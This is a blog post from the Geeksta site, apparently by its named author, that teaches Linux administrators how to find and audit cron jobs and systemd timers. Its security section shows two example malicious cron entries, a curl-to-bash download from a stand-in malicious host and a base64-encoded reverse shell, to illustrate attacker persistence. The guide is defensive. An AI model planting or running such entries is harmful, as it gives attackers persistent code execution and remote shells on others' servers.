@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>How to Inspect All Cron Jobs on a Linux System: A Sysadmin&#39;s Guide | Geeksta</title>
+<meta name="description" content="Learn how to inspect and audit cron jobs on Linux systems, identify suspicious tasks, and follow best practices to keep your scheduled tasks secure and efficient."><meta name="author" content="Ramiro Gómez"><link rel="canonical" itemprop="url" href="https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/">
+<link rel="icon" type="image/png" href="/img/icon-small.png">
+<link rel="alternate" type="application/rss+xml" href="/rss.xml" title="Geeksta All Posts RSS feed">
+            <meta property="og:image" content="/img/geeklog/geeklog-tux.png">
+    <link rel="stylesheet" href="/vendor/chota.min.css">
+    <link rel="stylesheet" href="/compiled/style.css">
+    <link rel="stylesheet" href="/compiled/dropdown.css">
+
+</head>
+<body>
+    <header><nav class="nav dark">
+        <div class="nav-left">
+            <a class="brand" href="/"><img class="logo" src="/img/icon-small.png" alt="logo">Geeksta</a>
+        </div>
+        <ul class="nav-right">
+            <li>
+                <a href="#">Sections ▾</a>
+                <ul class="dropdown">
+                    <li><a href="/reviews/">Book Reviews</a></li>
+                    <li><a href="/cover-art-overboard/">Cover Art Overboard</a>
+                    <li><a href="/visualizations/">Data Visualizations</a></li>
+                    <li><a href="/js-drawing/">Drawing with JavaScript</a></li>
+                    <li><a href="/events/">Geek Events</a></li>
+                    <li><a href="/screencasts/">Screencasts</a></li>
+                    <li><a href="/videos/">Videos</a></li>
+                </ul>
+            </li>
+            <li><a href="/geeklog/">Geeklog</a></li>
+            <li><a href="/merch/">Merch</a></li>
+            <li><a href="/tools/">Tools</a></li>
+        </ul>
+    </nav></header>
+
+    <main class="container">
+<div class="row">
+    <div class="col-9-md">
+        <h1>How to Inspect All Cron Jobs on a Linux System: A Sysadmin's Guide</h1>
+        <p>Cron is one of the most fundamental tools in a Linux sysadmin's toolkit. It powers everything from nightly database backups to certificate renewals, log rotations, and application health checks. Once scheduled, cron jobs run silently in the background, which is both their strength and their risk.</p>
+<p>Because cron jobs run unattended, they are easy to overlook. Over time, a server accumulates scheduled tasks added by different users, applications, and installers. Without periodic audits, it becomes impossible to know exactly what is running on your system, when, and as whom.</p>
+<p>This guide will teach you where cron jobs live on a Linux system, how to inspect them for all users at once, what normal cron jobs look like, and what suspicious ones look like. By the end, you will have a repeatable process for auditing scheduled tasks on any Linux server.</p>
+<h2 id="a-quick-cron-refresher">A Quick Cron Refresher</h2>
+<h3 id="how-cron-works">How Cron Works</h3>
+<p>Cron is a time-based job scheduler. The <code>crond</code> daemon runs continuously in the background and wakes up every minute to check whether any scheduled task is due to run. Jobs are defined in crontab files, which are plain text files that include a schedule and a command.</p>
+<p>There are two types of crontabs: user crontabs (personal to each system user) and system crontabs (owned by root or placed in dedicated directories by applications). Both are checked by the same <code>crond</code> daemon.</p>
+<h3 id="cron-schedule-syntax">Cron Schedule Syntax</h3>
+<p>Every cron job starts with five fields that define when the job should run, followed by the command itself:</p>
+<pre><code class="language-txt">* * * * *  command
+│ │ │ │ │
+│ │ │ │ └─ Day of week (0–7, Sunday = 0 or 7)
+│ │ │ └─── Month (1–12)
+│ │ └───── Day of month (1–31)
+│ └─────── Hour (0–23)
+└───────── Minute (0–59)
+</code></pre>
+<p>An asterisk <code>*</code> in any field means "every" — every minute, every hour, and so on. Commas let you specify multiple values (<code>1,15,30</code>). Hyphens define ranges (<code>1-5</code> for Monday through Friday). A forward slash defines a step (<code>*/15</code> means every 15 minutes).</p>
+<p>For example:</p>
+<pre><code class="language-bash"># Run at 2:30 AM every day
+30 2 * * * /usr/local/bin/backup.sh
+
+# Run every 15 minutes
+*/15 * * * * /usr/local/bin/healthcheck.sh
+
+# Run at noon on the first of every month
+0 12 1 * * /usr/local/bin/monthly-report.sh
+</code></pre>
+<h3 id="special-time-strings">Special Time Strings</h3>
+<p>Cron also supports shorthand strings as an alternative to the five-field syntax:</p>
+<table>
+<thead>
+<tr>
+<th>String</th>
+<th>Equivalent</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>@reboot</code></td>
+<td>—</td>
+<td>Run once at system startup</td>
+</tr>
+<tr>
+<td><code>@hourly</code></td>
+<td><code>0 * * * *</code></td>
+<td>Run once per hour</td>
+</tr>
+<tr>
+<td><code>@daily</code></td>
+<td><code>0 0 * * *</code></td>
+<td>Run once per day at midnight</td>
+</tr>
+<tr>
+<td><code>@weekly</code></td>
+<td><code>0 0 * * 0</code></td>
+<td>Run once per week on Sunday</td>
+</tr>
+<tr>
+<td><code>@monthly</code></td>
+<td><code>0 0 1 * *</code></td>
+<td>Run once per month on the first</td>
+</tr>
+<tr>
+<td><code>@yearly</code></td>
+<td><code>0 0 1 1 *</code></td>
+<td>Run once per year on January 1st</td>
+</tr>
+</tbody>
+</table>
+<h2 id="common-real-world-cron-job-examples">Common Real-World Cron Job Examples</h2>
+<p>Understanding what legitimate cron jobs look like makes it much easier to spot unusual or suspicious ones. Here are the most common categories of scheduled tasks you will encounter in production environments.</p>
+<h3 id="backups">Backups</h3>
+<p>Backups are among the most important scheduled tasks on any server. Common examples include nightly database dumps, syncing files to remote storage, and archiving log files.</p>
+<pre><code class="language-bash"># Dump MySQL database nightly at 1 AM
+0 1 * * * root mysqldump -u root mydb &gt; /backups/mydb_$(date +\%F).sql
+</code></pre>
+<h3 id="log-rotation-and-cleanup">Log Rotation and Cleanup</h3>
+<p>Log files can consume enormous amounts of disk space if left unchecked. Cron jobs are used to rotate logs, compress old ones, and purge entries beyond a certain age. On most systems, <code>logrotate</code> is itself invoked by a daily cron job.</p>
+<pre><code class="language-bash"># Logrotate runs as a daily cron job on most systems (/etc/cron.daily/logrotate)
+/usr/sbin/logrotate /etc/logrotate.conf
+
+# Delete temp files older than 7 days
+0 3 * * * root find /tmp -mtime +7 -delete
+</code></pre>
+<h3 id="tls-certificate-renewal">TLS Certificate Renewal</h3>
+<p>Let's Encrypt certificates expire every 90 days. Certbot installs a cron job or systemd timer to handle renewal automatically. If installed via a package manager, you will typically find it in <code>/etc/cron.d/</code> or <code>/etc/cron.daily/</code>.</p>
+<pre><code class="language-bash"># Certbot renewal check twice daily (common pattern)
+0 */12 * * * root certbot renew --quiet
+</code></pre>
+<h3 id="system-updates">System Updates</h3>
+<p>Some organizations configure servers to apply security updates automatically on a schedule, reducing the window of exposure from known vulnerabilities.</p>
+<pre><code class="language-bash"># Apply security updates weekly (Debian/Ubuntu)
+0 4 * * 0 root apt-get update &amp;&amp; apt-get -y upgrade
+
+# Run yum-cron for automatic updates (RHEL/CentOS)
+0 0 * * * root /usr/sbin/yum-cron
+</code></pre>
+<h3 id="monitoring-and-health-checks">Monitoring and Health Checks</h3>
+<p>Cron is often used to run lightweight monitoring checks that send an alert or write to a log if something is amiss. Disk usage checks, ping tests, and process monitoring are common examples.</p>
+<pre><code class="language-bash"># Alert if disk usage exceeds 90%
+*/10 * * * * root df -h | awk '$5 &gt; 90 {print}' | mail -s 'Disk Warning' admin@example.com
+
+# Check that Apache is running every 5 minutes, restart if not
+*/5 * * * * root pgrep apache2 || systemctl restart apache2
+</code></pre>
+<h3 id="application-maintenance">Application Maintenance</h3>
+<p>Applications often install their own cron jobs as part of their package setup. These jobs handle tasks such as cleaning up PHP sessions, scrubbing filesystems, and restarting internal services. For instance, CloudPanel installs daily jobs to restart <code>rsyslog</code> and its own agent service as part of regular housekeeping for a hosting control panel.</p>
+<pre><code class="language-bash"># Clean PHP sessions twice per hour
+09,39 * * * * root [ -x /usr/lib/php/sessionclean ] &amp;&amp; /usr/lib/php/sessionclean
+
+# CloudPanel: restart logging service nightly
+5 0 * * * clp /usr/bin/sudo /etc/init.d/rsyslog restart &amp;&gt; /dev/null
+
+# CloudPanel: restart agent service
+15 2 * * * clp /usr/bin/sudo /usr/bin/systemctl restart clp-agent &amp;&gt; /dev/null
+</code></pre>
+<h2 id="where-cron-jobs-live-on-a-linux-system">Where Cron Jobs Live on a Linux System</h2>
+<p>Cron jobs can be defined in several different places. A thorough audit requires checking all of them.</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/crontab</code></td>
+<td>Main system crontab</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/</code></td>
+<td>Application-specific cron files</td>
+</tr>
+<tr>
+<td><code>/etc/cron.hourly/</code></td>
+<td>Scripts run every hour</td>
+</tr>
+<tr>
+<td><code>/etc/cron.daily/</code></td>
+<td>Scripts run every day</td>
+</tr>
+<tr>
+<td><code>/etc/cron.weekly/</code></td>
+<td>Scripts run every week</td>
+</tr>
+<tr>
+<td><code>/etc/cron.monthly/</code></td>
+<td>Scripts run every month</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/crontabs/</code></td>
+<td>User crontabs (Debian/Ubuntu)</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/</code></td>
+<td>User crontabs (RHEL/CentOS)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="etccrontab">/etc/crontab</h3>
+<p>The main system-wide crontab. Unlike user crontabs, entries here include an additional field specifying which user the command runs as. You can view it with <code>cat /etc/crontab</code>.</p>
+<h3 id="etccrond">/etc/cron.d/</h3>
+<p>Applications that need to install their own cron schedules drop files here rather than modifying the main crontab. Each file follows the same format as <code>/etc/crontab</code>. This is commonly where you will find jobs from packages like <code>sysstat</code>, <code>certbot</code>, and hosting control panels.</p>
+<h3 id="etccrondaily-cronhourly-cronweekly-cronmonthly">/etc/cron.daily/, cron.hourly/, cron.weekly/, cron.monthly/</h3>
+<p>These directories contain plain shell scripts (not crontab format) that are executed on the corresponding schedule. The timing is determined by entries in <code>/etc/crontab</code> or by the <code>anacron</code> service. List their contents with:</p>
+<pre><code class="language-bash">ls -la /etc/cron.daily/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+</code></pre>
+<h3 id="varspoolcron">/var/spool/cron/</h3>
+<p>User crontabs are created by individual users via <code>crontab -e</code> and stored here, in files named after each user. On Debian and Ubuntu the subdirectory is called <code>crontabs</code>; on Red Hat-based systems the files sit directly in <code>/var/spool/cron/</code>. As root you can read any of them directly.</p>
+<h2 id="how-to-inspect-cron-jobs">How to Inspect Cron Jobs</h2>
+<h3 id="your-own-crontab">Your Own Crontab</h3>
+<p>View your own user's crontab with:</p>
+<pre><code class="language-bash">crontab -l
+</code></pre>
+<p>If you have no cron jobs set up, this will print <code>no crontab for &lt;username&gt;</code>.</p>
+<h3 id="a-specific-users-crontab">A Specific User's Crontab</h3>
+<p>As root, inspect any individual user's crontab using the <code>-u</code> flag:</p>
+<pre><code class="language-bash">crontab -u username -l
+</code></pre>
+<h3 id="all-users-at-once">All Users at Once</h3>
+<p>The most thorough approach is to loop through every user on the system and print their crontab. The following one-liner reads all usernames from <code>/etc/passwd</code> and queries each one:</p>
+<pre><code class="language-bash">for user in $(cut -f1 -d: /etc/passwd); do
+    echo &quot;=== Crontab for $user ===&quot;
+    crontab -u $user -l 2&gt;/dev/null
+done
+</code></pre>
+<p>The <code>2&gt;/dev/null</code> suppresses the "no crontab for this user" messages, keeping the output clean. Only users with actual cron jobs will produce output beyond the header line.</p>
+<h3 id="system-cron-files">System Cron Files</h3>
+<p>Check all system-level cron configuration in one pass:</p>
+<pre><code class="language-bash"># View the main system crontab
+cat /etc/crontab
+
+# View all files in cron.d
+cat /etc/cron.d/*
+
+# List scripts in the schedule directories
+ls -la /etc/cron.daily/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+</code></pre>
+<h3 id="directly-inspect-the-spool-directory">Directly Inspect the Spool Directory</h3>
+<p>You can also read user crontabs directly from the spool directory as root, which is useful for scripting and automation:</p>
+<pre><code class="language-bash"># Debian/Ubuntu
+grep -r . /var/spool/cron/crontabs/ 2&gt;/dev/null
+
+# RHEL/CentOS
+grep -r . /var/spool/cron/ 2&gt;/dev/null
+</code></pre>
+<h3 id="check-running-cron-processes">Check Running Cron Processes</h3>
+<p>To verify the cron daemon is active and see any currently running cron processes:</p>
+<pre><code class="language-bash"># Check daemon status
+systemctl status cron       # Debian/Ubuntu
+systemctl status crond      # RHEL/CentOS
+
+# List running cron processes
+ps aux | grep cron
+</code></pre>
+<h3 id="view-cron-logs">View Cron Logs</h3>
+<p>Cron logs reveal what has already run, including errors and timing. Check the relevant log file for your distribution:</p>
+<pre><code class="language-bash"># Debian/Ubuntu: cron entries in syslog
+grep CRON /var/log/syslog | tail -50
+
+# RHEL/CentOS: dedicated cron log
+tail -50 /var/log/cron
+
+# systemd-based systems: use journalctl
+journalctl -u cron --since today
+journalctl -u crond --since today
+</code></pre>
+<blockquote>
+<p><strong>Tip:</strong> If a cron job is failing silently, the logs are usually the first place to look. An error in the logs combined with an unexpected system state (missing files, full disk) can quickly reveal the culprit.</p>
+</blockquote>
+<h2 id="a-note-on-systemd-timers">A Note on Systemd Timers</h2>
+<p>On modern Linux distributions, systemd timers are increasingly used as an alternative or complement to cron. They provide more precise scheduling, dependency management, and built-in logging through the journal. Importantly, a job defined as a systemd timer will <strong>not</strong> appear in any crontab audit.</p>
+<p>To see all systemd timers, including the next scheduled run time for each:</p>
+<pre><code class="language-bash">systemctl list-timers --all
+</code></pre>
+<p>If you find timers you do not recognize, investigate the associated service unit:</p>
+<pre><code class="language-bash"># Show the timer definition
+systemctl cat my-timer.timer
+
+# Show what service the timer activates
+systemctl cat my-timer.service
+</code></pre>
+<p>On many Debian and Ubuntu servers, you might find that certain tasks you would expect to be cron jobs, like <code>apt</code> daily updates and <code>e2fsck</code> scrubbing, have been moved to systemd timers. For this reason, it's important to include both cron and systemd in any full audit of scheduled tasks.</p>
+<h2 id="security-considerations">Security Considerations</h2>
+<h3 id="why-attackers-love-cron">Why Attackers Love Cron</h3>
+<p>Cron is a favorite tool for attackers seeking persistence. Once they have gained access to a system, planting a cron job ensures they retain that access even if the initial vulnerability is patched, the compromised process is restarted, or the system is rebooted. A well-hidden cron job can persist for months without detection.</p>
+<h3 id="what-suspicious-cron-jobs-look-like">What Suspicious Cron Jobs Look Like</h3>
+<p>When auditing cron jobs after a suspected compromise, look for any of the following red flags:</p>
+<ul>
+<li>Commands that download files from the internet, especially <code>curl</code> or <code>wget</code> piped directly to <code>bash</code></li>
+<li>Commands that connect back to an unusual IP address or domain (reverse shells)</li>
+<li>Base64-encoded commands, which are used to obfuscate payloads</li>
+<li>Jobs that write to unexpected locations, especially <code>/tmp</code>, <code>/dev/shm</code>, or hidden directories</li>
+<li>Jobs running as root that were not placed there by a known package</li>
+<li>Jobs that modify <code>/etc/passwd</code>, <code>/etc/shadow</code>, or SSH <code>authorized_keys</code> files</li>
+<li>Cron job names designed to blend in with legitimate system tasks</li>
+</ul>
+<p>A particularly common attacker pattern looks like this:</p>
+<pre><code class="language-bash"># Classic cryptominer persistence via cron
+*/5 * * * * root curl -s http://malicious.example.com/update.sh | bash
+
+# Obfuscated reverse shell
+*/10 * * * * nobody echo YmFzaCAtaSA+Ji9kZXYvdGNw... | base64 -d | bash
+</code></pre>
+<h3 id="best-practices">Best Practices</h3>
+<p>Following a few simple principles can significantly reduce your risk surface around cron:</p>
+<ul>
+<li><strong>Principle of least privilege:</strong> Cron jobs should run as the least privileged user possible. Avoid running jobs as root unless absolutely necessary. Use dedicated service accounts with restricted permissions for specific tasks.</li>
+<li><strong>Log cron output:</strong> Redirect stdout and stderr to a log file rather than discarding output. Silent failures are harder to detect, and logs can help debug unexpected issues.</li>
+<li><strong>Periodic audits:</strong> Schedule a regular review of all cron jobs as part of your security routine, not just after incidents. Include both user and system crontabs and ensure no unauthorized entries exist.</li>
+<li><strong>Version control:</strong> Keep a copy of known-good cron configurations in source control so you can diff against what is currently on the server. This helps you quickly identify unwanted changes.</li>
+<li><strong>Monitor for changes:</strong> Use tools like <code>auditd</code> or similar file integrity monitoring systems to alert you when crontab files are modified. Monitoring <code>/var/spool/cron/</code>, <code>/etc/crontab</code>, and <code>/etc/cron.d/</code> for alterations can provide early warnings of unauthorized additions.</li>
+<li><strong>Restrict user access:</strong> Control who can create cron jobs by using <code>/etc/cron.allow</code> and <code>/etc/cron.deny</code>. Only users with a legitimate need for scheduled tasks should be permitted to create them. Keeping this list concise limits your system's attack surface.</li>
+<li><strong>Validate scripts before scheduling:</strong> Run and review scripts manually before automating them in cron to ensure they work as intended and do not introduce unintended security vulnerabilities.</li>
+<li><strong>Balance output redirection:</strong> Log cron job output where possible, but ensure sensitive systems like production servers aren't overwhelmed by excessive log noise. For jobs where reliability is proven, you may discard output selectively using <code>&gt; /dev/null 2&gt;&amp;1</code>. However, even in these cases, ensure failure alerts are captured elsewhere.</li>
+<li><strong>Check for systemd timers:</strong> Include systemd timers in any full audit. They are increasingly used as an alternative to cron jobs and must be inspected to identify scheduled system tasks. Use <code>systemctl list-timers --all</code> regularly.</li>
+<li><strong>Time-zone awareness:</strong> Be mindful of time zones when scheduling cron jobs, especially on systems that might operate in multiple regions or adjust for daylight savings. Server configurations running in UTC time can help standardize schedules.</li>
+</ul>
+<pre><code class="language-bash"># Good practice: log cron output to a file
+0 2 * * * root /usr/local/bin/backup.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1
+
+# Discard output only when you are certain the job is reliable
+0 3 * * * root /usr/local/bin/cleanup.sh &gt; /dev/null 2&gt;&amp;1
+</code></pre>
+<p>By combining these practices into your workflow, you can greatly enhance the reliability and security of your scheduled tasks. Make auditing and maintaining cron jobs a regular routine alongside other system maintenance tasks.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Cron jobs are an essential aspect of Linux system administration, but their silent, automated nature often makes them easy to forget. Over time, a server that has been running for years can gather dozens of scheduled tasks from various users, packages, and installers. Some of these tasks might no longer be necessary, while others might even pose a risk.</p>
+<p>Here is a quick-reference audit checklist you can run on any server:</p>
+<pre><code class="language-bash"># 1. Check all user crontabs
+for user in $(cut -f1 -d: /etc/passwd); do
+    echo &quot;=== $user ===&quot;
+    crontab -u $user -l 2&gt;/dev/null
+done
+
+# 2. Check system crontabs
+cat /etc/crontab
+cat /etc/cron.d/*
+
+# 3. List cron script directories
+ls -la /etc/cron.{daily,hourly,weekly,monthly}/
+
+# 4. Read spool directly
+grep -r . /var/spool/cron/crontabs/ 2&gt;/dev/null   # Debian/Ubuntu
+grep -r . /var/spool/cron/ 2&gt;/dev/null             # RHEL/CentOS
+
+# 5. Check systemd timers too
+systemctl list-timers --all
+
+# 6. Review recent cron log activity
+grep CRON /var/log/syslog | tail -100
+</code></pre>
+<p>Make auditing your cron jobs a regular routine rather than a reactive measure when something goes wrong. Performing this audit quarterly or including it in your server onboarding checklist will provide a much clearer understanding of what your systems are doing, even during those early hours of the morning.</p>
+    </div>
+    <div class="col">
+
+<h3>Featured Merch</h3>
+<figure class="preview">
+    <a href="/design/linux-sysadmin-grunge/">
+            <img class="b-lazy" src="/img/large/linux-sysadmin-grunge.jpg" alt="Linux Sysadmin Penguin Cool Grunge Vintage Retro Design" />
+        <figcaption>Linux Sysadmin Penguin Cool Grunge Vintage Retro Design</figcaption>
+    </a>
+</figure>
+
+
+<h3>Latest Posts</h3>
+<ul>
+        <li><a href="/geeklog/building-a-3d-elevation-photo-diary/">Building a 3D Elevation Photo Diary with deck.gl</a></li>
+        <li><a href="/geeklog/thunderbird-keeps-threading-emails-here-s-the-fix/">Thunderbird Keeps Threading Emails? Here's the Fix</a></li>
+        <li><a href="/geeklog/social-media-dimensions-cheat-sheet/">Social Media Dimensions Cheat Sheet 2025</a></li>
+        <li><a href="/geeklog/limited-internet-changed-my-habits/">How Limiting My Internet Usage Changed the Way I Work and Live</a></li>
+</ul>
+
+<h3>Featured Book</h3>
+<figure class="preview">
+    <a href="https://www.amazon.com/dp/B0C5B9JG57?tag=geeksta-20">
+        <img alt="eBook cover" src="/img/books/chatgpt-interview-prompting.jpg"><br>
+        <figcaption>Buy on Amazon</figcaption>
+    </a>
+</figure>
+
+<hr>
+
+<a href="/rss.xml" class="button primary">Subscribe to RSS Feed</a></li>    </div>
+</div>
+<hr>
+<p>Published by <a href="https://ramiro.org/">Ramiro Gómez</a> on <time datetime="2026-02-10T13:19">February 10, 2026</time>. Subscribe to the <a href="/rss.xml">Geeksta RSS feed</a> to be informed about new posts.</p>
+<p><strong>Tags:</strong>
+    <a class="button outline" href="/tags/sysadmin/">sysadmin</a>
+    <a class="button outline" href="/tags/guide/">guide</a>
+    <a class="button outline" href="/tags/linux/">linux</a>
+    <a class="button outline" href="/tags/cron/">cron</a>
+</p>
+<p class="text-grey"><strong>Disclosure:</strong> External links on this website may contain affiliate IDs, which means that I earn a commission if you make a purchase using these links. This allows me to offer hopefully valuable content for free while keeping this website sustainable. For more information, please see the disclosure section on the <a href="/about/">about page</a>.</p><hr>
+<p><strong>Share post:</strong>
+<a rel="nofollow" href="https://www.facebook.com/sharer.php?u=https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/&t=How%20to%20Inspect%20All%20Cron%20Jobs%20on%20a%20Linux%20System%3A%20A%20Sysadmin%27s%20Guide" class="button success">Facebook</a>
+<a rel="nofollow" href="https://www.linkedin.com/shareArticle?mini=true&url=https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/&title=How%20to%20Inspect%20All%20Cron%20Jobs%20on%20a%20Linux%20System%3A%20A%20Sysadmin%27s%20Guide" class="button success">LinkedIn</a>
+<a rel="nofollow" href="https://reddit.com/submit?url=https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/&title=How%20to%20Inspect%20All%20Cron%20Jobs%20on%20a%20Linux%20System%3A%20A%20Sysadmin%27s%20Guide" class="button success">Reddit</a>
+<a rel="nofollow" href="https://twitter.com/share?url=https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/&text=How%20to%20Inspect%20All%20Cron%20Jobs%20on%20a%20Linux%20System%3A%20A%20Sysadmin%27s%20Guide" class="button success">Twitter</a>
+</p>
+<div class="card vm">
+    <h3>Merchandise</h3>
+    <div class="row">
+    <div class="col-3-md">
+        <figure class="preview">
+    <a href="/design/caution-i-test-in-production/">
+            <img class="b-lazy" src="/img/large/caution-i-test-in-production.jpg" alt="I Test in Production - Funny Developer Caution Sign Design" />
+        <figcaption>I Test in Production - Funny Developer Caution Sign Design</figcaption>
+    </a>
+</figure>
+
+    </div>
+    <div class="col-3-md">
+        <figure class="preview">
+    <a href="/design/hack-the-planet-green/">
+            <img class="b-lazy" src="/img/large/hack-the-planet-green.jpg" alt="Hack the Planet - Green Globe Design for Computer Hackers" />
+        <figcaption>Hack the Planet - Green Globe Design for Computer Hackers</figcaption>
+    </a>
+</figure>
+
+    </div>
+    <div class="col-3-md">
+        <figure class="preview">
+    <a href="/design/run-bsd/">
+            <img class="b-lazy" src="/img/large/run-bsd.jpg" alt="RUN BSD - Cool White/Red Design for Unix Hackers & Sysadmins" />
+        <figcaption>RUN BSD - Cool White/Red Design for Unix Hackers & Sysadmins</figcaption>
+    </a>
+</figure>
+
+    </div>
+    <div class="col-3-md">
+        <figure class="preview">
+    <a href="/design/shrug-it-works-on-my-machine-medium-white/">
+            <img class="b-lazy" src="/img/large/shrug-it-works-on-my-machine-medium-white.jpg" alt="Shrug It Works On My Machine Funny Programmer Excuse White Design" />
+        <figcaption>Shrug It Works On My Machine Funny Programmer Excuse White Design</figcaption>
+    </a>
+</figure>
+
+    </div>
+</div>
+
+</div>    </main>
+
+    <footer class="dark"><div class="container">
+        Geeksta elsewhere: <a href="https://www.instagram.com/g33ksta/">Instagram</a> • <a href="https://www.youtube.com/@geeksta">YouTube</a> • <a href="https://www.tiktok.com/@g33ksta">TikTok</a> • <a href="https://www.facebook.com/geeksta.net/">Facebook</a>
+        <br>
+        © 2010 - 2026 Ramiro Gómez. <a href="/about/">About/Legal info</a> • <a href="/rss.xml">RSS Feed</a></p>
+    </div></footer>
+
+    <script src="/compiled/script.js"></script>
+
+<script async src="https://scripts.simpleanalyticscdn.com/latest.js"></script>
+<noscript><img src="https://queue.simpleanalyticscdn.com/noscript.gif" alt="" referrerpolicy="no-referrer-when-downgrade"/></noscript><script type="application/ld+json">
+{
+    "@context": "https://schema.org/",
+    "@type": "BlogPosting",
+    "@id": "https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/#BlogPosting",
+    "mainEntityOfPage": "https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/",
+    "headline": "How to Inspect All Cron Jobs on a Linux System: A Sysadmin's Guide",
+    "description": "Learn how to inspect and audit cron jobs on Linux systems, identify suspicious tasks, and follow best practices to keep your scheduled tasks secure and efficient.",
+    "datePublished": "2026-02-10 13:19:42",
+    "dateModified": "2026-02-10 13:19:43.386143",
+    "author": { "@type": "Person", "name": "Ramiro Gómez", "url": "https://geeksta.net" },
+    "url": "https://geeksta.net/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/",
+    "keywords": ["cron", "guide", "linux", "sysadmin"],
+    "inLanguage": "en"
+}
+</script>
+</body>
+</html>
